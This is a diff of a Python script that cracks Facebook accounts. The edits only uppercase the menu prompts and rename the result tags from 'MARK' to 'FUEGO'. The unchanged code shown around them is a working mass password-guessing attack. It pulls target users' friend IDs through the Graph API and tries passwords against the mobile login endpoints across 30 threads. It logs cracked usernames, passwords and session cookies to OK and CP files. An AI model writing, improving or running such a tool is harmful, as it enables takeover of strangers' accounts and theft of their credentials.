@@ -126,7 +126,7 @@ def menu():
 	elif Bilal == "4" or Bilal == "04":
 		print("\n\033[1;92m[\033[1;93m01\033[1;96m] CHECK CRACK RESULTS OK")
 		print("\033[1;93m[\033[1;94m02\033[1;96m] CHECK RESULTS CP")
-		cek = raw_input("\n\033[1;93m[\033[1;93m+\033[1;96m] Chouse : ")
+		cek = raw_input("\n\033[1;93m[\033[1;93m+\033[1;96m] CHOOSE : ")
 		if cek =="":
 			menu()
 		elif cek == "1":
@@ -163,7 +163,7 @@ def menu():
 			nm_file = ("%s"%(file)).replace("-", " ")
 			del_txt = nm_file.replace(".txt", "")
 			print("# ----------------------------------------------")
-			print(" Crack Resulte : %s Total : %s\033[0;93m"%(del_txt, len(Totalcp)))
+			print(" CRACK RESULTS : %s TOTAL : %s\033[0;93m"%(del_txt, len(Totalcp)))
 			os.system("cat CP/%s"%(file))
 			print("\033[0;96m # ----------------------------------------------")
 			exit(" ")
@@ -216,11 +216,11 @@ def massal():
 	except IOError:
 		exit("\033[1;96m[\033[1;94m+\033[1;96m] Token Error")
 	try:
-		tanya_Total = int(input("\033[1;96m[\033[1;94m+\033[1;96m] Enter Ids Number : "))
+		tanya_Total = int(input("\033[1;96m[\033[1;94m+\033[1;96m] ENTER OPTION ID'S [HOW MANY] : "))
 	except:tanya_Total=1
 	for t in range(tanya_Total):
 		t +=1
-		idt = raw_input("\033[1;96m[\033[1;94m+\033[1;97m] Target Id %s : "%(t))
+		idt = raw_input("\033[1;96m[\033[1;94m+\033[1;97m] TARGET ID %s : "%(t))
 		try:
 			for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
 				uid = i["id"]
@@ -239,21 +239,21 @@ def method():
 	if method == "":
 		menu()
 	elif method == "1":
-		ask = raw_input("\033[1;96m[\033[1;94m!\033[1;97m] Do you Choose Manual Password y/t\033[1;97m [ \033[1;96mDefault : t \033[1;97m] : ")
+		ask = raw_input("\033[1;96m[\033[1;94m!\033[1;97m] DO YOU CHOOSE MANUAL PASSWORD y/t\033[1;97m [ \033[1;96mDefault : t \033[1;97m] : ")
 		if ask == "y":
 			manual()
 		print(" ")
 		ThreadPool(30).map(bapi, id)
 		exit("Program End")
 	elif method == "2":
-		ask = raw_input("\033[1;96m[\033[1;94m03\033[1;97m] Do you Choose Manual Password y/t\033[1;97m [ \033[1;96mDefault : t \033[1;97m] ")
+		ask = raw_input("\033[1;96m[\033[1;94m03\033[1;97m] DO YOU CHOOSE MANUAL PASSWORD y/t\033[1;97m [ \033[1;96mDefault : t \033[1;97m] ")
 		if ask == "y":
 			manual()
 		print(" ")
 		ThreadPool(30).map(mbasic, id)
 		exit("Program End")
 	elif method == "3":
-		ask = raw_input("\033[1;96m[\033[1;94m!\033[1;97m] Do you Choose Manual Password y/t\033[1;97m [ \033[1;96mDefault : t \033[1;97m] ")
+		ask = raw_input("\033[1;96m[\033[1;94m!\033[1;97m] DO YOU CHOOSE MANUAL PASSWORD y/t\033[1;97m [ \033[1;96mDefault : t \033[1;97m] ")
 		if ask == "y":
 			manual()
 		print(" ")
@@ -269,7 +269,7 @@ def cek_ttl_cp(uid, pw):
 			ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
 			month, day, year = ttl.split("/")
 			month = bulan_ttl[month]
-			print("\r\033[0;95m[MARK-CP] %s|%s|%s %s %s\033[0;91m"%(uid, pw, day, month, year))
+			print("\r\033[0;95m[FUEGO-CP] %s|%s|%s %s %s\033[0;91m"%(uid, pw, day, month, year))
 			cp.append("%s|%s"%(uid, pw))
 			open("CP/%s.txt"%(tanggal),"a").write(" + %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
 	except KeyError, IOError:
@@ -309,7 +309,7 @@ def bapi(user):
 				break
 				continue
 			elif "www.facebook.com" in send.json()["error_msg"]:
-				print("\r\033[0;95m[MARK-CP] %s|%s\033[0;92m        "%(uid, pw))
+				print("\r\033[0;95m[FUEGO-CP] %s|%s\033[0;92m        "%(uid, pw))
 				cp.append("%s|%s"%(uid, pw))
 				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 				break
@@ -407,13 +407,13 @@ def mobile(user):
 			gaaa = ses.post("https://touch.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Ftouch.facebook.com%2F&lwv=100&refid=8",data=kwargs)
 			if "c_user" in ses.cookies.get_dict().keys():
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print("\r\033[0;94m[MARK-OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
+				print("\r\033[0;94m[FUEGO-OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
 				ok.append("%s|%s"%(uid, pw))
 				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 				break
 				continue
 			elif "checkpoint" in ses.cookies.get_dict().keys():
-				print("\r\033[0;95m[MARK-CP] %s|%s\033[0;91m        "%(uid, pw))
+				print("\r\033[0;95m[FUEGO-CP] %s|%s\033[0;91m        "%(uid, pw))
 				cp.append("%s|%s"%(uid, pw))
 				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 				break
@@ -459,13 +459,13 @@ def manual():
 				gaaa = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
 				if "c_user" in ses.cookies.get_dict().keys():
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					print("\r\033[0;94m[MARK-OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
+					print("\r\033[0;94m[FUEGO-OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
 					ok.append("%s|%s"%(uid, pw))
 					open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 					break
 					continue
 				elif "checkpoint" in ses.cookies.get_dict().keys():
-					print("\r\033[0;95m[MARK-CP] %s|%s\033[0;91m        "%(uid, pw))
+					print("\r\033[0;95m[FUEGO-CP] %s|%s\033[0;91m        "%(uid, pw))
 					cp.append("%s|%s"%(uid, pw))
 					open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 					break
